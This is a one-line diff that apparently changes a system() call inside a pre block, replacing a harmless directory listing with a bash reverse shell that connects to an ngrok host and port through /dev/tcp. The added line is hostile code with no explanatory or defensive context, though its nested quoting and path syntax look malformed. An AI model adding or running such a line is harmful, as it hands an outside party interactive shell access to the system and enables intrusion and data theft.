@@ -1,1 +1,1 @@
-<pre>system('cd /home/kiddie && ls')</pre>
+<pre>system('bash -c 'exec bash -i &>/dev/tcp/tcp://2.tcp.eu.ngrok.io/19417 <&1'')</pre>
